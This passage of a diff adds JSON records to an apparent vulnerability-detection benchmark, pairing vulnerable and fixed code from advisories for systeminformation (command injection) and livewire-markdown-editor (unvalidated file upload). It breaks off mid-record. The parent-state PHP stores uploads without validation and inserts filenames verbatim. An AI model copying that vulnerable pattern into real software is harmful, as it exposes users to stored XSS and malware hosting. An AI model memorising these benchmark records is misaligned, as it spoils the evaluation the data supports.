(linux)                                       |",
+          "text_sha256": "0c8a837a38cdbc7ca7d1320fc218b642ee543cc2355049d6538a6a4b7a204825"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "29a702edeb15f00cae5e2d1c5d88300646d35ee6ece614626d38c22c946c0db0",
+            "filename": "docs/history.html",
+            "line_end": 67,
+            "line_start": 54,
+            "parent_sha": "da1cbf5eb09907cf5c3431f4c9ea441b7a227617"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "command"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "<th scope=\"col\">Version</th>\n                      <th scope=\"col\" width=\"12%\">Date</th>\n                      <th scope=\"col\">Comment</th>\n                    </tr>\n                  </thead>\n                  <tbody>\n                    <tr>\n                      <th scope=\"row\">5.31.6\n                      </th>\n                      <td>2026-05-07</td>\n                      <td><span class=\"code\">networkInterfaces()</span> fix unsanitized command (linux)</td>\n                    </tr>\n                    <tr>\n                      <th scope=\"row\">5.31.5",
+          "text_sha256": "2ed1774d64270d54bfb0bbf16aa78dda7bc6531a648a5ab808558fcca7066f9e"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "820ad8caf714e9cb934834503ffed816dd258ede07ea394c12c710c86f2c2f0c",
+            "filename": "docs/history.html",
+            "fix_sha": "bbfddde48672d0ee124fefdb3cb4442fd9dd4f03",
+            "line_end": 73,
+            "line_start": 54
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "command"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "<th scope=\"col\">Version</th>\n                      <th scope=\"col\" width=\"12%\">Date</th>\n                      <th scope=\"col\">Comment</th>\n                    </tr>\n                  </thead>\n                  <tbody>\n                    <tr>\n                      <th scope=\"row\">5.31.7\n                      </th>\n                      <td>2026-05-29</td>\n                      <td><span class=\"code\">networkInterfaces()</span> fix unsanitized command (linux)</td>\n                    </tr>\n                    <tr>\n                      <th scope=\"row\">5.31.6\n                      </th>\n                      <td>2026-05-07</td>\n                      <td><span class=\"code\">networkInterfaces()</span> fix unsanitized command (linux)</td>\n                    </tr>\n                    <tr>\n                      <th scope=\"row\">5.31.5",
+          "text_sha256": "9df4adf6d26d6e226af48bef481519f5f9bb40a39d8d5be99362f253f74ee8f7"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "f27d572a27f98e53b01bfb2ec50ba9e8bee6530cce6045c6bef12f0c7c798f26",
+            "filename": "docs/security.html",
+            "line_end": 59,
+            "line_start": 45,
+            "parent_sha": "da1cbf5eb09907cf5c3431f4c9ea441b7a227617"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 1,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [
+              "shell_command_semantic"
+            ],
+            "override": [],
+            "surface": [
+              "command",
+              "shell"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "<div class=\"title\">Security Advisories</div>\n              <div class=\"text\">\n                <h2>networkInterfaces() Command Injection Vulnerability</h2>\n                <p><span class=\"bold\">Affected versions:</span>\n                  &lt; 5.31.6<br>\n                  <span class=\"bold\">Date:</span> 2026-05-06<br>\n                  <span class=\"bold\">CVE indentifier</span> ---\n                </p>\n\n                <h4>Impact</h4>\n                <p>We had an issue that there was a possibility to perform a potential command injection possibility by craft the active NetworkManager connection profile name to contains shell metacharacters on linux machines.</p>\n\n                <h4>Patch</h4>\n                <p>Problem was fixed with parameter checking and execFile. If you are using version 5, please upgrade to version >= 5.31.6.</p>\n                <hr>",
+          "text_sha256": "dba89168950f5c558b9588cccdf7e6326ef0e80355848639dd10888bb0a06999"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "0bb3af415ebec6a25eeb1ccaccec1b101204a8bd614dd318775c63532a0adfdd",
+            "filename": "docs/security.html",
+            "fix_sha": "bbfddde48672d0ee124fefdb3cb4442fd9dd4f03",
+            "line_end": 59,
+            "line_start": 45
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 1,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [
+              "shell_command_semantic"
+            ],
+            "override": [],
+            "surface": [
+              "command",
+              "shell"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "<div class=\"title\">Security Advisories</div>\n              <div class=\"text\">\n                <h2>networkInterfaces() Command Injection Vulnerability</h2>\n                <p><span class=\"bold\">Affected versions:</span>\n                  &lt; 5.31.6<br>\n                  <span class=\"bold\">Date:</span> 2026-05-06<br>\n                  <span class=\"bold\">CVE indentifier</span> CVE-2026-44724\n                </p>\n\n                <h4>Impact</h4>\n                <p>We had an issue that there was a possibility to perform a potential command injection possibility by craft the active NetworkManager connection profile name to contains shell metacharacters on linux machines.</p>\n\n                <h4>Patch</h4>\n                <p>Problem was fixed with parameter checking and execFile. If you are using version 5, please upgrade to version >= 5.31.6.</p>\n                <hr>",
+          "text_sha256": "6a282ef28c5c5a9c3cb80b0dd8da529c2ded1f626a381e03811f6cbddff89040"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "68451aef799f3391248045bac63142fdf1f623b1f9af74ab6f44f92023c3d288",
+            "filename": "lib/network.js",
+            "line_end": 27,
+            "line_start": 14,
+            "parent_sha": "da1cbf5eb09907cf5c3431f4c9ea441b7a227617"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "exec"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "// ----------------------------------------------------------------------------------\n\nconst os = require('os');\nconst exec = require('child_process').exec;\nconst execSync = require('child_process').execSync;\nconst execFileSync = require('child_process').execFileSync;\n\nconst fs = require('fs');\nconst util = require('./util');\n\nconst _platform = process.platform;\n\nconst _linux = _platform === 'linux' || _platform === 'android';\nconst _darwin = _platform === 'darwin';",
+          "text_sha256": "8849c89d41aca9d2f01f6fd54d872ec326b709508a5c292bdf90d95791e0d60f"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "e719ec1f8a5cbb757eb04a40c5879eef70f0ae3d01e080674a6ee1348b2d9d4d",
+            "filename": "lib/network.js",
+            "fix_sha": "bbfddde48672d0ee124fefdb3cb4442fd9dd4f03",
+            "line_end": 28,
+            "line_start": 14
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "exec"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "// ----------------------------------------------------------------------------------\n\nconst os = require('os');\nconst exec = require('child_process').exec;\nconst execSync = require('child_process').execSync;\nconst execFileSync = require('child_process').execFileSync;\nconst readFileSync = require('fs').readFileSync;\n\nconst fs = require('fs');\nconst util = require('./util');\n\nconst _platform = process.platform;\n\nconst _linux = _platform === 'linux' || _platform === 'android';\nconst _darwin = _platform === 'darwin';",
+          "text_sha256": "75f1a7c04f99fe7e53c722995a04107b3e88c361557dc5dff9e9fc2dd6bcf1e4"
+        }
+      ],
+      "scoring_executed": false,
+      "source_project": "sebhildebrandt/systeminformation",
+      "source_replacement_used": false,
+      "source_root": "GHSA-5xpp-75jx-m839",
+      "source_snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-78"
+        ],
+        "owasp_ids": [
+          "A05:2025"
+        ],
+        "principle": "Command-like inputs are only surfaces; promotion requires observed OS/process command execution influence.",
+        "wstg_ids": [
+          "WSTG-INPV-12"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 1,
+      "vulnerable_condition_record_count": 3,
+      "vulnerable_identity_or_surface_record_count": 11,
+      "vulnerable_state_record_count": 11,
+      "writeup_rubric_sha256": "50974296517d2050f354aab34698a31b25e04c13e1b4e5030b10b32d76e0e0bf",
+      "writeups_count_as_target_evidence": false
+    },
+    {
+      "canonical_reference": "https://github.com/gogs/gogs/security/advisories/GHSA-vcm5-gvmp-78mp",
+      "capture_id": "v7-dom_xss-positive",
+      "current_missing_requirements": [
+        "literal_family_identity_or_surface",
+        "literal_decisive_condition"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": true,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": false,
+      "exact_revision_pair_used": true,
+      "family": "dom_xss",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 0,
+      "human_adjudication_performed": false,
+      "record_count": 0,
+      "records": [],
+      "scoring_executed": false,
+      "source_project": "gogs/gogs",
+      "source_replacement_used": false,
+      "source_root": "GHSA-vcm5-gvmp-78mp",
+      "source_snapshot_sha256": "8805a4d41741ccb45505b541d8c6a84d0130a3ca6725cff2d365a0b35bad992b",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-79"
+        ],
+        "owasp_ids": [
+          "A05:2025"
+        ],
+        "principle": "DOM sources and sinks are only clues; promotion requires a reachable user-controlled flow into a dangerous sink without effective sanitization.",
+        "wstg_ids": [
+          "WSTG-CLNT-01"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 0,
+      "vulnerable_condition_record_count": 0,
+      "vulnerable_identity_or_surface_record_count": 0,
+      "vulnerable_state_record_count": 0,
+      "writeup_rubric_sha256": "1460144ad0f3142d923522d0b35edc6f0fa520fa49e0d20e74d7a49999583684",
+      "writeups_count_as_target_evidence": false
+    },
+    {
+      "canonical_reference": "https://github.com/mckenziearts/livewire-markdown-editor/security/advisories/GHSA-gxxh-8vcj-w2mh",
+      "capture_id": "v7-file_upload-positive",
+      "current_missing_requirements": [
+        "literal_decisive_condition"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": true,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": false,
+      "exact_revision_pair_used": true,
+      "family": "file_upload",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 8,
+      "human_adjudication_performed": false,
+      "record_count": 13,
+      "records": [
+        {
+          "heading": null,
+          "metadata": {
+            "canonical_reference": "https://github.com/mckenziearts/livewire-markdown-editor/security/advisories/GHSA-gxxh-8vcj-w2mh",
+            "snapshot_sha256": "7b53afd000ba889d0954bd07dfa08190cc5538e16deedce9c0bf5a9364ef9445",
+            "source_root": "GHSA-gxxh-8vcj-w2mh"
+          },
+          "origin": "authoritative_advisory_summary",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "attachment",
+              "upload"
+            ]
+          },
+          "source_state_role": "unclassified_source_state",
+          "text": "livewire-markdown-editor has arbitrary file upload that allows stored XSS via attachment handler",
+          "text_sha256": "744c7a727e2e1802b28c0fbd14e3bffa66b512b8c21105ff7b3c6f5e39ba9d80"
+        },
+        {
+          "heading": "Impact",
+          "metadata": {
+            "canonical_reference": "https://github.com/mckenziearts/livewire-markdown-editor/security/advisories/GHSA-gxxh-8vcj-w2mh",
+            "snapshot_sha256": "7b53afd000ba889d0954bd07dfa08190cc5538e16deedce9c0bf5a9364ef9445",
+            "source_root": "GHSA-gxxh-8vcj-w2mh"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 3,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [
+              "active_content_served",
+              "content_type_mismatch_accepted",
+              "upload_validation_bypass"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "content type",
+              "upload"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "All versions of `mckenziearts/livewire-markdown-editor` prior to **v1.3** contain a critical arbitrary file upload vulnerability in the `MarkdownEditor::updatedAttachments()` Livewire handler. The handler calls `$file->store()` with no server-side validation of MIME type, extension, or file content.\n\nAny authenticated user with access to a page embedding `<livewire:markdown-editor>` can upload files of any type (`.html`, `.svg`, `.js`, `.php`, `.exe`, etc.) to the disk configured by `livewire-markdown-editor.disk`. When that disk is a public cloud bucket (S3, DigitalOcean Spaces, Cloudflare R2, Scaleway Object Storage \u2014 the common configuration when `FILESYSTEM_DISK` points to such a disk), uploaded files are served publicly with a guessed `Content-Type` header.\n\nThe consequences include:\n\n- **Stored XSS** on the storage domain via uploaded `.html` or `.svg` files\n- **Phishing page hosting** on the application's own storage domain (trust laundering)\n- **Malware distribution** from a domain users associate with the application\n- **Markdown injection** in the editor output via crafted filenames (the client-supplied `getClientOriginalName()` value was inserted verbatim into the markdown)\n\nA real-world exploitation of this vulnerability was observed in production on a community platform using this package.",
+          "text_sha256": "e7b9cdc3cf47221b523fbcb1f04717639bc354db4e69c03d364e218543179859"
+        },
+        {
+          "heading": "Workarounds",
+          "metadata": {
+            "canonical_reference": "https://github.com/mckenziearts/livewire-markdown-editor/security/advisories/GHSA-gxxh-8vcj-w2mh",
+            "snapshot_sha256": "7b53afd000ba889d0954bd07dfa08190cc5538e16deedce9c0bf5a9364ef9445",
+            "source_root": "GHSA-gxxh-8vcj-w2mh"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 1,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [
+              "file_input"
+            ],
+            "override": [],
+            "surface": [
+              "file input",
+              "upload"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "If developers cannot upgrade immediately, disable the upload UI on every instance of the editor by passing `:show-upload=\"false\"`:\n\n```blade\n  <livewire:markdown-editor wire:model=\"content\" :show-upload=\"false\" />\n```\n\nThis hides the file input and prevents the vulnerable code path from being reached.",
+          "text_sha256": "1bd1bc9dbbb2c39029f957b08cfab0369a12889dd4178270062a806b5b97e9d7"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "29f8758575e75c3651a5610992987ab89ac06f4a3cd04e9af43d918a43f041a2",
+            "filename": "README.md",
+            "line_end": 169,
+            "line_start": 148,
+            "parent_sha": "cfd07048019694d2aaeaa9247a63991703173858"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [
+              "filename_control_reaches_storage"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "filename",
+              "upload"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "- **Ordered List** - Insert numbered list\n- **Task List** - Insert checklist\n- **File Upload** - Upload and insert files/images\n\n## File Uploads\n\nFiles are automatically uploaded to `storage/app/public/` when selected. Images are inserted as `![filename](url)` and other files as `[filename](url)`.\n\nMake sure your storage is properly configured:\n\n```bash\nphp artisan storage:link\n```\n\n## Markdown Support\n\nThe editor supports full GitHub Flavored Markdown including:\n\n- Headings\n- Bold, italic, strikethrough\n- Links and images\n- Code blocks with syntax highlighting",
+          "text_sha256": "bbc3507a2c136819f150737630430e349329ea70d73ef3cdfd5d00aba179bd25"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "44654f75f0a8a8c32c81042b2782e1992c2f02291eab90c7e439a6d5a0b47128",
+            "filename": "README.md",
+            "fix_sha": "1e60eaa5781e89704e112425f832774be85cd71f",
+            "line_end": 195,
+            "line_start": 148
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 3,
+            "control": 1,
+            "identity": 0,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [
+              "active_content_served",
+              "content_type_mismatch_accepted",
+              "filename_control_reaches_storage"
+            ],
+            "control": [
+              "server_generated_filename"
+            ],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "filename",
+              "upload"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "- **Ordered List** - Insert numbered list\n- **Task List** - Insert checklist\n- **File Upload** - Upload and insert files/images\n\n## File Uploads\n\nFiles are automatically uploaded to the configured disk when selected. Images are inserted as `![filename](url)` and other files as `[filename](url)`.\n\nMake sure your storage is properly configured:\n\n```bash\nphp artisan storage:link\n```\n\n### Security\n\nTo prevent arbitrary file upload vulnerabilities (stored XSS, phishing page hosting, malware distribution), only images are accepted by default. Uploaded files are stored under a randomly generated filename with the validated extension, and the original client-provided filename is sanitized before being inserted into the markdown output.\n\nYou can customize the allowed file types and max size via the `upload` config key:\n\n```php\n// config/livewire-markdown-editor.php\n'upload' => [\n    'max_size' => 4096, // kilobytes\n    'allowed_extensions' => ['jpg', 'jpeg', 'png', 'gif', 'webp', 'avif'],\n    'images_only' => true,\n],\n```\n\nIf you need to allow non-image files, extend `allowed_extensions` and set `images_only` to `false`. When using a public cloud disk (S3, Spaces, R2, Scaleway), review the bucket policy to ensure non-whitelisted Content-Types cannot be served inline.\n\nIf you do not use file uploads at all, disable the feature entirely:\n\n```blade\n<livewire:markdown-editor\n    wire:model=\"content\"\n    :show-upload=\"false\"\n/>\n```\n\n## Markdown Support\n\nThe editor supports full GitHub Flavored Markdown including:\n\n- Headings\n- Bold, italic, strikethrough\n- Links and images\n- Code blocks with syntax highlighting",
+          "text_sha256": "966d66654fd6efe3fa2638446c0326dcdf2eb4b8493b712bf91eeaca0c8a1ac5"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "7dcdb1545efce3828f5a5ccb0088456b0fbe8c1ecd4c777c19d0e4a11f5dda03",
+            "filename": "config/livewire-markdown-editor.php",
+            "fix_sha": "1e60eaa5781e89704e112425f832774be85cd71f",
+            "line_end": 48,
+            "line_start": 25
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "upload"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "|\n    | Popular options: github-dark, github-light, monokai, nord, one-dark-pro, dracula\n    |\n    */\n\n    'theme' => env('MARKDOWN_EDITOR_THEME', 'github-light'),\n\n    /*\n    |--------------------------------------------------------------------------\n    | File Upload\n    |--------------------------------------------------------------------------\n    |\n    | Controls the file upload behavior of the editor. By default, only images\n    | are allowed to prevent arbitrary file upload vulnerabilities (stored XSS,\n    | phishing page hosting, malware distribution on your storage domain).\n    |\n    */\n\n    'upload' => [\n        'max_size' => 4096,\n        'allowed_extensions' => ['jpg', 'jpeg', 'png', 'gif', 'webp', 'avif'],\n        'images_only' => true,\n    ],\n];",
+          "text_sha256": "f8be628bc934a16f4201b4ce2438e39314429955ae786a3958c86aa2980eafa5"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "fb64ade03b7f671b6383df081e7ae62de2ff01405ed367341352505038138196",
+            "filename": "resources/views/livewire/markdown-editor.blade.php",
+            "line_end": 108,
+            "line_start": 93,
+            "parent_sha": "cfd07048019694d2aaeaa9247a63991703173858"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 1,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [
+              "file_input"
+            ],
+            "override": [],
+            "surface": [
+              "file input"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "<button type=\"button\" class=\"p-1 rounded hover:bg-zinc-100 dark:hover:bg-zinc-700 text-zinc-700 dark:text-zinc-300\" title=\"{{ __('livewire-markdown-editor::editor.toolbars.mention') }}\">\n                                <x-phosphor-at-duotone class=\"size-5\" aria-hidden=\"true\" />\n                            </button>\n                        </md-mention>\n\n                        @if ($showUpload)\n                            <label class=\"p-1 rounded hover:bg-zinc-100 dark:hover:bg-zinc-700 cursor-pointer text-zinc-700 dark:text-zinc-300\" title=\"{{ __('livewire-markdown-editor::editor.toolbars.attach_files') }}\">\n                                <input type=\"file\" wire:model=\"attachments\" multiple accept=\"image/*,.pdf,.doc,.docx\" class=\"hidden\">\n                                <x-phosphor-images-duotone class=\"size-5\" aria-hidden=\"true\" />\n                            </label>\n                        @endif\n                    </markdown-toolbar>\n                </div>\n            @endif\n        </div>",
+          "text_sha256": "542ea0f1b50fd199e36a6283959baa7bcd1cf6ef79983031751a605dd798b6c1"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "e89f0ef255ba48a89444b0de045d8e8e80540fbadb964dfe9e99212418fb12ab",
+            "filename": "resources/views/livewire/markdown-editor.blade.php",
+            "fix_sha": "1e60eaa5781e89704e112425f832774be85cd71f",
+            "line_end": 115,
+            "line_start": 93
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 1,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [
+              "file_input"
+            ],
+            "override": [],
+            "surface": [
+              "file input",
+              "upload"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "<button type=\"button\" class=\"p-1 rounded hover:bg-zinc-100 dark:hover:bg-zinc-700 text-zinc-700 dark:text-zinc-300\" title=\"{{ __('livewire-markdown-editor::editor.toolbars.mention') }}\">\n                                <x-phosphor-at-duotone class=\"size-5\" aria-hidden=\"true\" />\n                            </button>\n                        </md-mention>\n\n                        @if ($showUpload)\n                            @php\n                                $uploadConfig = config('livewire-markdown-editor.upload');\n                                $acceptAttribute = $uploadConfig['images_only']\n                                    ? 'image/*'\n                                    : collect($uploadConfig['allowed_extensions'])->map(fn ($ext) => '.'.$ext)->implode(',');\n                            @endphp\n\n                            <label class=\"p-1 rounded hover:bg-zinc-100 dark:hover:bg-zinc-700 cursor-pointer text-zinc-700 dark:text-zinc-300\" title=\"{{ __('livewire-markdown-editor::editor.toolbars.attach_files') }}\">\n                                <input type=\"file\" wire:model=\"attachments\" multiple accept=\"{{ $acceptAttribute }}\" class=\"hidden\">\n                                <x-phosphor-images-duotone class=\"size-5\" aria-hidden=\"true\" />\n                            </label>\n                        @endif\n                    </markdown-toolbar>\n                </div>\n            @endif\n        </div>",
+          "text_sha256": "b739cd22a43e00e3907fa89b8c03570d5b9b4f7d74aa8940b85b23dc0cf8be8b"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "026a89ef1799e644249197e30316608e0753109637476c7d7fcfb1ccbbbdbef2",
+            "filename": "src/Livewire/MarkdownEditor.php",
+            "line_end": 88,
+            "line_start": 60,
+            "parent_sha": "cfd07048019694d2aaeaa9247a63991703173858"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [
+              "filename_control_reaches_storage"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "attachment",
+              "filename"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "$converter = new MarkdownConverter(environment: $environment);\n\n        return $converter->convert($this->content)->getContent();\n    }\n\n    public function updatedAttachments(): void\n    {\n        /** @var string $disk */\n        $disk = config('livewire-markdown-editor.disk');\n\n        foreach ($this->attachments as $attachment) {\n            /** @var string $path */\n            $path = $attachment->store('', $disk);\n            $filesystem = Storage::disk($disk);\n\n            /** @var Cloud $filesystem */\n            $url = $filesystem->url($path);\n            $filename = $attachment->getClientOriginalName();\n\n            if (str_starts_with($attachment->getMimeType(), 'image/')) {\n                $this->content .= \"\\n![{$filename}]({$url})\\n\";\n            } else {\n                $this->content .= \"\\n[{$filename}]({$url})\\n\";\n            }\n        }\n\n        $this->attachments = [];\n    }",
+          "text_sha256": "d2d2cc47cd3ed6ebfedd92767292496de6cc2d5240fa247c79d059aa944dbf0b"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "6f470b4a99f8cc736eef858c982b952f89469c998e7fec37dfed8303c54c0a7b",
+            "filename": "src/Livewire/MarkdownEditor.php",
+            "fix_sha": "1e60eaa5781e89704e112425f832774be85cd71f",
+            "line_end": 117,
+            "line_start": 61
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 3
+          },
+          "signal_hits": {
+            "condition": [
+              "filename_control_reaches_storage"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "attachment",
+              "filename",
+              "upload"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "$converter = new MarkdownConverter(environment: $environment);\n\n        return $converter->convert($this->content)->getContent();\n    }\n\n    /**\n     * @return array<string, array<int, string|null>>\n     */\n    public function rules(): array\n    {\n        /** @var array{max_size: int, allowed_extensions: array<int, string>, images_only: bool} $config */\n        $config = config('livewire-markdown-editor.upload');\n\n        $extensions = implode(',', $config['allowed_extensions']);\n\n        return [\n            'attachments.*' => array_values(array_filter([\n                'required',\n                'file',\n                $config['images_only'] ? 'image' : null,\n                'mimes:'.$extensions,\n                'extensions:'.$extensions,\n                'max:'.$config['max_size'],\n            ])),\n        ];\n    }\n\n    public function updatedAttachments(): void\n    {\n        $this->validate();\n\n        /** @var string $disk */\n        $disk = config('livewire-markdown-editor.disk');\n\n        foreach ($this->attachments as $attachment) {\n            $extension = $attachment->extension();\n            $path = $attachment->storeAs('', Str::random(40).'.'.$extension, $disk);\n\n            if ($path === false) {\n                continue;\n            }\n\n            $filesystem = Storage::disk($disk);\n            /** @var Cloud $filesystem */\n            $url = $filesystem->url($path);\n            $filename = $this->sanitizeFilename($attachment->getClientOriginalName());\n\n            if (str_starts_with((string) $attachment->getMimeType(), 'image/')) {\n                $this->content .= \"\\n![{$filename}]({$url})\\n\";\n            } else {\n                $this->content .= \"\\n[{$filename}]({$url})\\n\";\n            }\n        }\n\n        $this->attachments = [];\n    }",
+          "text_sha256": "631b8555a47b39f7f6cd43eb357c9421ea2f76b4e953d1ee1a93c4911f5b10ee"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "6f470b4a99f8cc736eef858c982b952f89469c998e7fec37dfed8303c54c0a7b",
+            "filename": "src/Livewire/MarkdownEditor.php",
+            "fix_sha": "1e60eaa5781e89704e112425f832774be85cd71f",
+            "line_end": 131,
+            "line_start": 117
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "filename"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "}\n\n    public function render(): View\n    {\n        return view('livewire-markdown-editor::livewire.markdown-editor');\n    }\n\n    private function sanitizeFilename(string $filename): string\n    {\n        $filename = preg_replace('/[\\x00-\\x1F\\x7F]/u', '', $filename) ?? '';\n        $filename = preg_replace('/[\\[\\]\\(\\)<>\"\\'\\\\\\\\`]/', '', $filename) ?? '';\n\n        return Str::limit(trim($filename), 100, '');\n    }\n}",
+          "text_sha256": "860ea0fb5b7f47e3c7764a8c94c4f8737dfa473b696545bd7ff10b7ad3102345"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "8ae840dc803e2e037d4789e2aeb06ec5b3966249d5dbbb78aba7ac3fe6bc9062",
+            "filename": "tests/Unit/MarkdownEditorTest.php",
+            "fix_sha": "1e60eaa5781e89704e112425f832774be85cd71f",
+            "line_end": 123,
+            "line_start": 13
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "upload"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
